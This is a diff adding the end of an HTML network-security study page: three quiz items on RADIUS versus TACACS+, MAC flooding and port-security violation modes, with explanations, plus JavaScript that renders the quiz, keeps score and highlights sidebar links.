+        "RADIUS encrypts only the password field; TACACS+ encrypts the entire packet body",
+        "Both encrypt the entire packet body",
+        "Neither encrypts anything"
+      ],
+      answer: 1,
+      ex: "RADIUS encrypts only the password field (headers remain unencrypted) and uses UDP 1812/1813. TACACS+ is Cisco-proprietary, separates all three A's, encrypts the entire body, and uses TCP 49."
+    },
+    {
+      q: "What does a successful MAC flooding attack force a switch to do?",
+      opts: [
+        "Reboot automatically",
+        "Enter fail-open hub mode, broadcasting traffic to all ports",
+        "Encrypt all frames",
+        "Disable spanning tree"
+      ],
+      answer: 1,
+      ex: "Flooding the MAC table with thousands of fake addresses exhausts its memory. The switch cannot learn or look up addresses, so it falls back to flooding every frame to every port — enabling passive sniffing."
+    },
+    {
+      q: "Which port violation action drops non-compliant frames silently, with no logging?",
+      opts: ["Shutdown", "Restrict", "Protect", "Monitor"],
+      answer: 2,
+      ex: "Protect silently drops without logging. Restrict drops and logs a violation count. Shutdown disables the port until an admin resets it."
+    }
+  ];
+
+  var quizEl = document.getElementById("quiz");
+  var scoreEl = document.getElementById("quiz-score");
+  var answered = 0, correct = 0;
+
+  quizData.forEach(function (item, qi) {
+    var wrap = document.createElement("div");
+    wrap.className = "quiz-item";
+
+    var q = document.createElement("div");
+    q.className = "q";
+    q.textContent = (qi + 1) + ". " + item.q;
+    wrap.appendChild(q);
+
+    var explain = document.createElement("div");
+    explain.className = "explain";
+    explain.textContent = item.ex;
+
+    var done = false;
+
+    item.opts.forEach(function (opt, oi) {
+      var b = document.createElement("button");
+      b.className = "opt";
+      b.textContent = String.fromCharCode(65 + oi) + ") " + opt;
+      b.addEventListener("click", function () {
+        if (done) return;
+        done = true;
+        answered++;
+        if (oi === item.answer) {
+          b.classList.add("correct");
+          correct++;
+        } else {
+          b.classList.add("wrong");
+          wrap.querySelectorAll(".opt")[item.answer].classList.add("correct");
+        }
+        explain.classList.add("show");
+        scoreEl.textContent = "Score: " + correct + " / " + answered;
+      });
+      wrap.appendChild(b);
+    });
+
+    wrap.appendChild(explain);
+    quizEl.appendChild(wrap);
+  });
+
+  scoreEl.textContent = "Score: 0 / 0";
+
+  /* =====================================================================
+     15. SIDEBAR ACTIVE LINK
+     ===================================================================== */
+  var sections = document.querySelectorAll("section[id]");
+  var navLinks = document.querySelectorAll(".sidebar a");
+
+  if ("IntersectionObserver" in window) {
+    var observer = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          var id = entry.target.id;
+          var isDefence = entry.target.classList.contains("dsec");
+          navLinks.forEach(function (a) {
+            var match = a.getAttribute("href") === "#" + id;
+            a.classList.toggle(isDefence ? "d-active" : "active", match);
+          });
+        }
+      });
+    }, { rootMargin: "-15% 0px -70% 0px", threshold: 0 });
+    sections.forEach(function (s) { observer.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
